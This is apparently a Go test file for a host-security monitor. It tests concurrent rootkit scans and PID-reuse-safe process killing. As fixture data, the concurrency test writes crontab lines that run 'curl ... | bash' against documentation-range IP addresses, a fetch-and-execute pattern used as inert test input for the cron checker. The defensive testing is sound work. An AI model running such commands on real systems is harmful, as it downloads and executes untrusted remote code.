package monitor

import (
	"context"
	"fmt"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/xmarthost/xmartguard/agent/internal/settings"
	"github.com/xmarthost/xmartguard/agent/internal/store"
)

func newTestMonitor(t *testing.T) (*Monitor, string) {
	t.Helper()
	dir := t.TempDir()
	t.Setenv("XG_STATE_DIR", filepath.Join(dir, "state"))
	t.Setenv("XG_CONFIG_DIR", filepath.Join(dir, "conf"))
	db, err := store.Open()
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { db.Close() })
	st, _ := settings.Load()
	return &Monitor{DB: db, Settings: st, Log: slog.New(slog.NewTextHandler(io.Discard, nil))}, dir
}

func statLine(pid int, start uint64) string {
	f := make([]string, 20)
	for i := range f {
		f[i] = "0"
	}
	f[0] = "S"
	f[19] = fmt.Sprint(start)
	return fmt.Sprintf("%d (x) %s\n", pid, strings.Join(f, " "))
}

// A manual rkhunter run while the monitor loop checks processes and cron
// does not write the maps concurrently (run with -race), and only one
// rkhunter runs at a time (A5 F10, F12).
func TestRootkitRunConcurrentWithChecks(t *testing.T) {
	m, dir := newTestMonitor(t)
	rk := filepath.Join(dir, "rkhunter")
	os.WriteFile(rk, []byte("#!/bin/sh\nsleep 0.3\nfor i in 1 2 3 4 5 6 7 8; do echo \"Warning: inert test warning $i\"; done\n"), 0o755)
	cron := filepath.Join(dir, "cron")
	os.MkdirAll(cron, 0o755)
	for i := 0; i < 20; i++ {
		os.WriteFile(filepath.Join(cron, fmt.Sprint("user", i)), []byte(fmt.Sprintf("*/5 * * * * curl -s http://198.51.100.%d/a | bash\n", i)), 0o600)
	}
	m.Settings.Patch([]byte(`{"cron":{"disable":false}}`))
	m.Rkhunter, m.CronDirs, m.ProcRoot = rk, []string{cron}, filepath.Join(dir, "proc")
	os.MkdirAll(m.ProcRoot, 0o755)
	var wg sync.WaitGroup
	errs := make(chan error, 2)
	for i := 0; i < 2; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			_, err := m.RunRootkit(context.Background())
			errs <- err
		}()
	}
	for i := 0; i < 20; i++ {
		m.CheckProcesses()
		m.CheckCron()
		m.Status()
	}
	wg.Wait()
	close(errs)
	busy := 0
	for err := range errs {
		if err != nil && strings.Contains(err.Error(), "already running") {
			busy++
		}
	}
	if busy != 1 {
		t.Fatalf("%d runs refused; want exactly one", busy)
	}
}

// A PID reused by another process after /proc was read is not killed, and
// a killed PID does not exempt a later process that reuses it (A5 F11).
func TestKillChecksStartTime(t *testing.T) {
	m, dir := newTestMonitor(t)
	m.ProcRoot = filepath.Join(dir, "proc")
	m.init()
	os.MkdirAll(filepath.Join(m.ProcRoot, "4242"), 0o755)
	os.WriteFile(filepath.Join(m.ProcRoot, "4242", "stat"), []byte(statLine(4242, 900)), 0o644)
	if !m.samePID(ProcInfo{PID: 4242, Start: 900}) {
		t.Fatal("same process not recognised")
	}
	if m.samePID(ProcInfo{PID: 4242, Start: 100}) {
		t.Fatal("a reused PID would be killed")
	}
	if m.samePID(ProcInfo{PID: 4343, Start: 100}) {
		t.Fatal("a PID that exited would be killed")
	}
	m.killed[cpuKey{4242, 100}] = true
	if m.killed[cpuKey{4242, 900}] {
		t.Fatal("a later process with the killed PID is exempt")
	}
	// Entries of processes that are gone are forgotten.
	m.CheckProcesses()
	if len(m.killed) != 0 {
		t.Fatalf("killed not pruned: %v", m.killed)
	}
}
